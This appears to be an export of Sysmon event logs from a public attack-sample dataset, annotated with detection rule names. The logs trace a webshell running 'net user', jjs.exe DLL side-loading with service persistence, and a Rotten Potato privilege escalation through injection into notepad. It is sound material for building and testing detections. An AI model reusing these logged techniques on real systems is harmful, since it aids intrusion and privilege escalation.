CurrentDirectory: c:\windows\system32\inetsrv\
ProcessGuid: 365ABB72-4A01-5CE7-0000-0010EE9DAC00
CommandLine: '""c:\windows\system32\cmd.exe"" /c net user'
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x9cf992'
IntegrityLevel: High
ParentImage: C:\Windows\System32\inetsrv\w3wp.exe
UtcTime: 2019-05-24 01:33:53.112
"
2019-05-24T01:33:53.182587+00:00,Hacktool - EDR-Freeze Execution;Local Accounts Discovery;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Lateral Movement/LM_typical_IIS_webshell_sysmon_1_10_traces.evtx,1,Microsoft-Windows-Sysmon,1,1046,IEWIN7,"Image: C:\Windows\System32\net.exe
RuleName: ''
Description: Net Command
TerminalSessionId: 0
ParentCommandLine: '""c:\windows\system32\cmd.exe"" /c net user'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 2404
LogonGuid: 365ABB72-45C7-5CE7-0000-002092F99C00
Hashes: SHA1=9A544E2094273741AA2D3E7EA0AF303AF2B587EA,MD5=B9A4DAC2192FD78CDA097BFA79F6E7B2,SHA256=D468E6B1B79555AC8BCE0300942FD479689EB8F159F3A399848D3BF9B9990A56,IMPHASH=B1F584304D1C7F2899A954905D8318C7
ParentProcessGuid: 365ABB72-4A01-5CE7-0000-0010EE9DAC00
ProcessId: 788
CurrentDirectory: c:\windows\system32\inetsrv\
ProcessGuid: 365ABB72-4A01-5CE7-0000-00102DA1AC00
CommandLine: net  user
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x9cf992'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-05-24 01:33:53.152
"
2019-05-24T01:33:53.192601+00:00,Hacktool - EDR-Freeze Execution;Local Accounts Discovery;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Lateral Movement/LM_typical_IIS_webshell_sysmon_1_10_traces.evtx,1,Microsoft-Windows-Sysmon,1,1047,IEWIN7,"Image: C:\Windows\System32\net1.exe
RuleName: ''
Description: Net Command
TerminalSessionId: 0
ParentCommandLine: net  user
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 788
LogonGuid: 365ABB72-45C7-5CE7-0000-002092F99C00
Hashes: SHA1=387577C0B3B89FEFCE983DC42CFF456A33287035,MD5=2041012726EF7C95ED51C15C56545A7F,SHA256=A0BE13AC9443ACC6D2EEA474CC82A727BDB7E1009F573DBA34D269F9A6AAA347,IMPHASH=FB687F4F7ACC1F20B5382A2C932A259E
ParentProcessGuid: 365ABB72-4A01-5CE7-0000-00102DA1AC00
ProcessId: 712
CurrentDirectory: c:\windows\system32\inetsrv\
ProcessGuid: 365ABB72-4A01-5CE7-0000-0010B6A2AC00
CommandLine: C:\Windows\system32\net1  user
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x9cf992'
IntegrityLevel: High
ParentImage: C:\Windows\System32\net.exe
UtcTime: 2019-05-24 01:33:53.162
"
2019-05-24T15:38:58.238747+00:00,Service Binary in Suspicious Folder,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_powershell_execpolicy_changed_sysmon_13.evtx,1,Microsoft-Windows-Sysmon,13,1480,IEWIN7,"Image: C:\Windows\System32\svchost.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-CAPI2/Operational\Enabled
RuleName: ''
EventType: SetValue
ProcessId: 736
ProcessGuid: 365ABB72-0F32-5CE8-0000-0010E7C70000
UtcTime: 2019-05-24 15:38:58.218
Details: DWORD (0x00000001)
"
2019-05-24T15:38:58.489107+00:00,Service Binary in Suspicious Folder,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_powershell_execpolicy_changed_sysmon_13.evtx,1,Microsoft-Windows-Sysmon,13,1481,IEWIN7,"Image: C:\Windows\System32\svchost.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-CAPI2/Operational\Enabled
RuleName: ''
EventType: SetValue
ProcessId: 736
ProcessGuid: 365ABB72-0F32-5CE8-0000-0010E7C70000
UtcTime: 2019-05-24 15:38:58.479
Details: DWORD (0x00000000)
"
2019-05-24T15:38:58.529164+00:00,Service Binary in Suspicious Folder,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_powershell_execpolicy_changed_sysmon_13.evtx,1,Microsoft-Windows-Sysmon,13,1482,IEWIN7,"Image: C:\Windows\System32\svchost.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-CAPI2/Operational\Enabled
RuleName: ''
EventType: SetValue
ProcessId: 736
ProcessGuid: 365ABB72-0F32-5CE8-0000-0010E7C70000
UtcTime: 2019-05-24 15:38:58.509
Details: DWORD (0x00000001)
"
2019-05-24T15:38:58.569222+00:00,Service Binary in Suspicious Folder,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_powershell_execpolicy_changed_sysmon_13.evtx,1,Microsoft-Windows-Sysmon,13,1483,IEWIN7,"Image: C:\Windows\System32\svchost.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-CAPI2/Operational\Enabled
RuleName: ''
EventType: SetValue
ProcessId: 736
ProcessGuid: 365ABB72-0F32-5CE8-0000-0010E7C70000
UtcTime: 2019-05-24 15:38:58.549
Details: DWORD (0x00000000)
"
2019-05-26T04:01:42.385505+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Defense Evasion/apt10_jjs_sideloading_prochollowing_persist_as_service_sysmon_1_7_8_13.evtx,1,Microsoft-Windows-Sysmon,1,4857,IEWIN7,"Image: C:\Users\IEUser\Desktop\info.rar\jjs.exe
RuleName: ''
Description: Java(TM) Platform SE binary
TerminalSessionId: 1
ParentCommandLine: C:\Windows\Explorer.EXE
Product: Java(TM) Platform SE 8
Company: Oracle Corporation
ParentProcessId: 1372
LogonGuid: 365ABB72-0F31-5CEA-0000-002062290100
Hashes: SHA1=8CC66ED54FBEFF205151898D65F6415400124553,MD5=64FDBD98584331982A15B1F2DF7F08DA,SHA256=B5DE10A0091B7AAF491BDB810BCE6DAB3F6B4A1C7A917722B5DE014E4A08B6EB,IMPHASH=D3310CE6CBCACB3A9F0809BC33E38ABE
ParentProcessGuid: 365ABB72-0F32-5CEA-0000-0010B5460100
ProcessId: 3836
CurrentDirectory: C:\Users\IEUser\Desktop\info.rar\
ProcessGuid: 365ABB72-0FA6-5CEA-0000-001049B50A00
CommandLine: '""C:\Users\IEUser\Desktop\info.rar\jjs.exe"" '
FileVersion: 8.0.1710.11
User: IEWIN7\IEUser
LogonId: '0x12962'
IntegrityLevel: High
ParentImage: C:\Windows\explorer.exe
UtcTime: 2019-05-26 04:01:42.375
"
2019-05-26T04:01:42.545736+00:00,Potential JLI.dll Side-Loading,data/EVTX-ATTACK-SAMPLES/Defense Evasion/apt10_jjs_sideloading_prochollowing_persist_as_service_sysmon_1_7_8_13.evtx,1,Microsoft-Windows-Sysmon,7,4858,IEWIN7,"Image: C:\Users\IEUser\Desktop\info.rar\jjs.exe
Signature: ''
Hashes: SHA1=E6F33CBE295026319CF9DB3CA665BC2BC9D978AC,MD5=CE150468126EAE5D99359DDE3197B6EA,SHA256=02B95EF7A33A87CC2B3B6FD47DB03E711045974E1ECF631D3BA9E076E1E374E9,IMPHASH=D386CCEF9C3130690E1183697F8E3ED9
RuleName: Evasion - Possible DLL Side Loading via jjs.exe
Description: '?'
ProcessId: 3836
SignatureStatus: Unavailable
ProcessGuid: 365ABB72-0FA6-5CEA-0000-001049B50A00
Signed: 'false'
FileVersion: '?'
ImageLoaded: C:\Users\IEUser\Desktop\info.rar\jli.dll
Product: '?'
Company: '?'
UtcTime: 2019-05-26 04:01:42.505
"
2019-05-26T04:01:42.625851+00:00,Service Binary in Suspicious Folder,data/EVTX-ATTACK-SAMPLES/Defense Evasion/apt10_jjs_sideloading_prochollowing_persist_as_service_sysmon_1_7_8_13.evtx,1,Microsoft-Windows-Sysmon,13,4859,IEWIN7,"Image: C:\Windows\system32\services.exe
TargetObject: HKLM\System\CurrentControlSet\services\HxUpdateServiceInfo\Start
RuleName: ''
EventType: SetValue
ProcessId: 452
ProcessGuid: 365ABB72-8DBD-5CEA-0000-0010D75D0000
UtcTime: 2019-05-26 04:01:42.565
Details: DWORD (0x00000002)
"
2019-05-26T04:01:42.645880+00:00,Service Binary in Suspicious Folder,data/EVTX-ATTACK-SAMPLES/Defense Evasion/apt10_jjs_sideloading_prochollowing_persist_as_service_sysmon_1_7_8_13.evtx,1,Microsoft-Windows-Sysmon,13,4860,IEWIN7,"Image: C:\Windows\system32\services.exe
TargetObject: HKLM\System\CurrentControlSet\services\HxUpdateServiceInfo\ImagePath
RuleName: ''
EventType: SetValue
ProcessId: 452
ProcessGuid: 365ABB72-8DBD-5CEA-0000-0010D75D0000
UtcTime: 2019-05-26 04:01:42.565
Details: '""C:\Users\IEUser\Desktop\info.rar\jjs.exe""'
"
2019-05-26T04:01:42.966340+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Defense Evasion/apt10_jjs_sideloading_prochollowing_persist_as_service_sysmon_1_7_8_13.evtx,1,Microsoft-Windows-Sysmon,1,4861,IEWIN7,"Image: C:\Users\IEUser\Desktop\info.rar\jjs.exe
RuleName: ''
Description: Java(TM) Platform SE binary
TerminalSessionId: 0
ParentCommandLine: C:\Windows\system32\services.exe
Product: Java(TM) Platform SE 8
Company: Oracle Corporation
ParentProcessId: 452
LogonGuid: 365ABB72-8DBD-5CEA-0000-0020E7030000
Hashes: SHA1=8CC66ED54FBEFF205151898D65F6415400124553,MD5=64FDBD98584331982A15B1F2DF7F08DA,SHA256=B5DE10A0091B7AAF491BDB810BCE6DAB3F6B4A1C7A917722B5DE014E4A08B6EB,IMPHASH=D3310CE6CBCACB3A9F0809BC33E38ABE
ParentProcessGuid: 365ABB72-8DBD-5CEA-0000-0010D75D0000
ProcessId: 3884
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-0FA6-5CEA-0000-0010FEC30A00
CommandLine: '""C:\Users\IEUser\Desktop\info.rar\jjs.exe""'
FileVersion: 8.0.1710.11
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\services.exe
UtcTime: 2019-05-26 04:01:42.946
"
2019-05-26T04:01:42.966340+00:00,Potential JLI.dll Side-Loading,data/EVTX-ATTACK-SAMPLES/Defense Evasion/apt10_jjs_sideloading_prochollowing_persist_as_service_sysmon_1_7_8_13.evtx,1,Microsoft-Windows-Sysmon,7,4862,IEWIN7,"Image: C:\Users\IEUser\Desktop\info.rar\jjs.exe
Signature: ''
Hashes: SHA1=E6F33CBE295026319CF9DB3CA665BC2BC9D978AC,MD5=CE150468126EAE5D99359DDE3197B6EA,SHA256=02B95EF7A33A87CC2B3B6FD47DB03E711045974E1ECF631D3BA9E076E1E374E9,IMPHASH=D386CCEF9C3130690E1183697F8E3ED9
RuleName: Evasion - Possible DLL Side Loading via jjs.exe
Description: '?'
ProcessId: 3884
SignatureStatus: Unavailable
ProcessGuid: 365ABB72-0FA6-5CEA-0000-0010FEC30A00
Signed: 'false'
FileVersion: '?'
ImageLoaded: C:\Users\IEUser\Desktop\info.rar\jli.dll
Product: '?'
Company: '?'
UtcTime: 2019-05-26 04:01:42.956
"
2019-05-26T04:01:43.567204+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;Suspect Svchost Activity;UAC Bypass Using NTFS Reparse Point - Process;Uncommon Svchost Command Line Parameter;Uncommon Svchost Parent Process;Windows Processes Suspicious Parent Directory,data/EVTX-ATTACK-SAMPLES/Defense Evasion/apt10_jjs_sideloading_prochollowing_persist_as_service_sysmon_1_7_8_13.evtx,1,Microsoft-Windows-Sysmon,1,4863,IEWIN7,"Image: C:\Windows\System32\svchost.exe
RuleName: ''
Description: Host Process for Windows Services
TerminalSessionId: 0
ParentCommandLine: '""C:\Users\IEUser\Desktop\info.rar\jjs.exe""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3884
LogonGuid: 365ABB72-8DBD-5CEA-0000-0020E7030000
Hashes: SHA1=4AF001B3C3816B860660CF2DE2C0FD3C1DFB4878,MD5=54A47F6B5E09A77E61649109C6A08866,SHA256=121118A0F5E0E8C933EFD28C9901E54E42792619A8A3A6D11E1F0025A7324BC2,IMPHASH=58E185299ECCA757FE68BA83A6495FDE
ParentProcessGuid: 365ABB72-0FA6-5CEA-0000-0010FEC30A00
ProcessId: 3908
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-0FA7-5CEA-0000-001064C60A00
CommandLine: C:\Windows\system32\svchost.exe
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Users\IEUser\Desktop\info.rar\jjs.exe
UtcTime: 2019-05-26 04:01:43.557
"
2019-05-26T15:47:56.667118+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/privesc_rotten_potato_from_webshell_metasploit_sysmon_1_8_3.evtx,1,Microsoft-Windows-Sysmon,1,5408,IEWIN7,"Image: C:\Windows\System32\notepad.exe
RuleName: ''
Description: Notepad
TerminalSessionId: 0
ParentCommandLine: c:\windows\system32\inetsrv\w3wp.exe -ap ""DefaultAppPool"" -v ""v2.0"" -l ""webengine4.dll"" -a \\.\pipe\iisipmb9da32d5-aa43-42fc-aeea-0cc226e10973 -h ""C:\inetpub\temp\apppools\DefaultAppPool\DefaultAppPool.config"" -w """" -m 0 -t 20
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 2744
LogonGuid: 365ABB72-B26B-5CEA-0000-002023240800
Hashes: SHA1=FC64B1EF19E7F35642B2A2EA5F5D9F4246866243,MD5=A4F6DF0E33E644E802C8798ED94D80EA,SHA256=B56AFE7165AD341A749D2D3BD925D879728A1FE4A4DF206145C1A69AA233F68B,IMPHASH=53A6715F589E88C4FD4541C81B4F57C3
ParentProcessGuid: 365ABB72-B26B-5CEA-0000-0010582A0800
ProcessId: 3388
CurrentDirectory: c:\windows\system32\inetsrv\
ProcessGuid: 365ABB72-B52C-5CEA-0000-00107A0D1100
CommandLine: C:\Windows\System32\notepad.exe
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x82423'
IntegrityLevel: High
ParentImage: C:\Windows\System32\inetsrv\w3wp.exe
UtcTime: 2019-05-26 15:47:56.627
"
2019-05-26T15:47:56.667118+00:00,Uncommon Process Access Rights For Target Image,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/privesc_rotten_potato_from_webshell_metasploit_sysmon_1_8_3.evtx,1,Microsoft-Windows-Sysmon,10,5409,IEWIN7,"TargetProcessId: 3388
TargetImage: C:\Windows\System32\notepad.exe
SourceThreadId: 168
RuleName: ''
GrantedAccess: '0x1fffff'
SourceProcessGUID: 365ABB72-B26B-5CEA-0000-0010582A0800
SourceProcessId: 2744
TargetProcessGUID: 365ABB72-B52C-5CEA-0000-00107A0D1100
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+4530c|C:\Windows\system32\kernel32.dll+51133|C:\Windows\system32\kernel32.dll+5cc37|C:\Windows\system32\kernel32.dll+20ae|UNKNOWN(0358F723)|UNKNOWN(010B7486)|UNKNOWN(010B73A0)|UNKNOWN(010B78A3)|C:\Windows\system32\kernel32.dll+4ef3c|C:\Windows\SYSTEM32\ntdll.dll+63618|C:\Windows\SYSTEM32\ntdll.dll+635eb
UtcTime: 2019-05-26 15:47:56.627
SourceImage: c:\windows\system32\inetsrv\w3wp.exe
"
2019-05-26T15:47:57.628501+00:00,Rare Remote Thread Creation By Uncommon Source Image;Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/privesc_rotten_potato_from_webshell_metasploit_sysmon_1_8_3.evtx,1,Microsoft-Windows-Sysmon,8,5411,IEWIN7,"TargetProcessId: 3388
NewThreadId: 3520
SourceImage: C:\Windows\System32\inetsrv\w3wp.exe
RuleName: ''
TargetProcessGuid: 365ABB72-B52C-5CEA-0000-00107A0D1100
SourceProcessGuid: 365ABB72-B26B-5CEA-0000-0010582A0800
StartFunction: ''
SourceProcessId: 2744
StartAddress: '0x005A28D0'
StartModule: ''
UtcTime: 2019-05-26 15:47:57.628
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-26T15:47:58.830229+00:00,Network Connection Initiated Via Notepad.EXE,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/privesc_rotten_potato_from_webshell_metasploit_sysmon_1_8_3.evtx,1,Microsoft-Windows-Sysmon,3,5413,IEWIN7,"DestinationHostname: IEWIN7
UtcTime: 2019-05-26 15:47:57.119
SourcePortName: ''
Image: C:\Windows\System32\notepad.exe
RuleName: ''
DestinationIp: 127.0.0.1
DestinationPort: 49167
Protocol: tcp
SourceHostname: IEWIN7
DestinationPortName: ''
SourcePort: 7777
ProcessId: 3388
ProcessGuid: 365ABB72-B52C-5CEA-0000-00107A0D1100
DestinationIsIpv6: false
User: IIS APPPOOL\DefaultAppPool
Initiated: false
SourceIp: 127.0.0.1
SourceIsIpv6: false
"
2019-05-26T15:47:58.830229+00:00,Network Connection Initiated Via Notepad.EXE,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/privesc_rotten_potato_from_webshell_metasploit_sysmon_1_8_3.evtx,1,Microsoft-Windows-Sysmon,3,5412,IEWIN7,"DestinationHostname: IEWIN7
UtcTime: 2019-05-26 15:47:57.111
SourcePortName: ''
Image: C:\Windows\System32\notepad.exe
RuleName: ''
DestinationIp: 127.0.0.1
DestinationPort: 135
Protocol: tcp
SourceHostname: IEWIN7
DestinationPortName: epmap
SourcePort: 49166
ProcessId: 3388
ProcessGuid: 365ABB72-B52C-5CEA-0000-00107A0D1100
DestinationIsIpv6: false
User: IIS APPPOOL\DefaultAppPool
Initiated: true
SourceIp: 127.0.0.1
SourceIsIpv6: false
"
2019-05-26T15:47:59.871726+00:00,Network Connection Initiated Via Notepad.EXE,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/privesc_rotten_potato_from_webshell_metasploit_sysmon_1_8_3.evtx,1,Microsoft-Windows-Sysmon,3,5415,IEWIN7,"DestinationHostname: IEWIN7
UtcTime: 2019-05-26 15:47:58.140
SourcePortName: ''
Image: C:\Windows\System32\notepad.exe
RuleName: ''
DestinationIp: 127.0.0.1
DestinationPort: 135
Protocol: tcp
SourceHostname: IEWIN7
DestinationPortName: epmap
SourcePort: 49169
ProcessId: 3388
ProcessGuid: 365ABB72-B52C-5CEA-0000-00107A0D1100
DestinationIsIpv6: false
User: IIS APPPOOL\DefaultAppPool
Initiated: true
SourceIp: 127.0.0.1
SourceIsIpv6: false
"
2019-05-26T15:47:59.871726+00:00,Network Connection Initiated Via Notepad.EXE,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/privesc_rotten_potato_from_webshell_metasploit_sysmon_1_8_3.evtx,1,Microsoft-Windows-Sysmon,3,5414,IEWIN7,"DestinationHostname: IEWIN7
UtcTime: 2019-05-26 15:47:58.117
SourcePortName: ''
Image: C:\Windows\System32\notepad.exe
RuleName: ''
DestinationIp: 127.0.0.1
DestinationPort: 49168
Protocol: tcp
SourceHostname: IEWIN7
DestinationPortName: ''
SourcePort: 7777
ProcessId: 3388
ProcessGuid: 365ABB72-B52C-5CEA-0000-00107A0D1100
DestinationIsIpv6: false
User: IIS APPPOOL\DefaultAppPool
Initiated: false
SourceIp: 127.0.0.1
SourceIsIpv6: false
"
2019-05-26T15:48:00.732965+00:00,Network Connection Initiated Via Notepad.EXE,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/privesc_rotten_potato_from_webshell_metasploit_sysmon_1_8_3.evtx,1,Microsoft-Windows-Sysmon,3,5417,IEWIN7,"DestinationHostname: IEWIN7
UtcTime: 2019-05-26 15:47:59.148
SourcePortName: ''
Image: C:\Windows\System32\notepad.exe
RuleName: ''
DestinationIp: 127.0.0.1
DestinationPort: 135
Protocol: tcp
SourceHostname: IEWIN7
DestinationPortName: epmap
SourcePort: 49171
ProcessId: 3388
ProcessGuid: 365ABB72-B52C-5CEA-0000-00107A0D1100
DestinationIsIpv6: false
User: IIS APPPOOL\DefaultAppPool
Initiated: true
SourceIp: 127.0.0.1
SourceIsIpv6: false
"
2019-05-26T15:48:00.732965+00:00,Network Connection Initiated Via Notepad.EXE,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/privesc_rotten_potato_from_webshell_metasploit_sysmon_1_8_3.evtx,1,Microsoft-Windows-Sysmon,3,5416,IEWIN7,"DestinationHostname: IEWIN7
UtcTime: 2019-05-26 15:47:59.147
SourcePortName: ''
Image: C:\Windows\System32\notepad.exe
RuleName: ''
DestinationIp: 127.0.0.1
DestinationPort: 49170
Protocol: tcp
SourceHostname: IEWIN7
DestinationPortName: ''
SourcePort: 7777
ProcessId: 3388
ProcessGuid: 365ABB72-B52C-5CEA-0000-00107A0D1100
DestinationIsIpv6: false
User: IIS APPPOOL\DefaultAppPool
Initiated: false
SourceIp: 127.0.0.1
SourceIsIpv6: false
"
2019-05-26T15:48:00.752994+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/privesc_rotten_potato_from_webshell_metasploit_sysmon_1_8_3.evtx,1,Microsoft-Windows-Sysmon,8,5419,IEWIN7,"TargetProcessId: 1240
NewThreadId: 1948
SourceImage: C:\Windows\System32\notepad.exe
RuleName: ''
TargetProcessGuid: 365ABB72-B530-5CEA-0000-0010621A1100
SourceProcessGuid: 365ABB72-B52C-5CEA-0000-00107A0D1100
StartFunction: ''
SourceProcessId: 3388
StartAddress: '0x00060000'
StartModule: ''
UtcTime: 2019-05-26 15:48:00.752
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-26T15:48:00.752994+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/privesc_rotten_potato_from_webshell_metasploit_sysmon_1_8_3.evtx,1,Microsoft-Windows-Sysmon,1,5418,IEWIN7,"Image: C:\Windows\System32\notepad.exe
RuleName: ''
Description: Notepad
TerminalSessionId: 0
ParentCommandLine: C:\Windows\System32\notepad.exe
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3388
LogonGuid: 365ABB72-B135-5CEA-0000-0020E7030000
Hashes: SHA1=FC64B1EF19E7F35642B2A2EA5F5D9F4246866243,MD5=A4F6DF0E33E644E802C8798ED94D80EA,SHA256=B56AFE7165AD341A749D2D3BD925D879728A1FE4A4DF206145C1A69AA233F68B,IMPHASH=53A6715F589E88C4FD4541C81B4F57C3
ParentProcessGuid: 365ABB72-B52C-5CEA-0000-00107A0D1100
ProcessId: 1240
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-B530-5CEA-0000-0010621A1100
CommandLine: '""C:\Windows\System32\notepad.exe""'
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\notepad.exe
UtcTime: 2019-05-26 15:48:00.742
"
